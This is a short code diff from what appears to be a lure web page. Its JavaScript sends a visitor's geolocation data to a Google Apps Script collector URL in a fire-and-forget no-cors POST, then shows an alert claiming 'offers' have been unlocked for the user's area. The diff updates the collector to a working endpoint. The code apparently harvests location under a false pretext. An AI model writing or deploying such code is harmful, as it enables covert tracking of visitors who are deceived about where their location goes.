@@ -114,11 +114,11 @@
         accuracy: position.coords.accuracy
       };
 
-      fetch("https://script.google.com/u/0/home/projects/1Y0K5QeVB90xMbiBdDG-di9ZG1as6DnNf5bzRU9ohb3bElH_BXKqDJV1e/exec", {
+      fetch("https://script.google.com/macros/s/AKfycby9gjhdzroN5DiCEA1MkgXTsdPhNjpQzM7Fr3B0Cyqcu2UtRr9vWNIFNZG9JVxNve0A/exec", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data),
-        mode: "no-cors"  // allows request without CORS errors but no response read
+        mode: "no-cors"
       })
       .then(() => {
         alert("✅ Offers unlocked based on your area!");
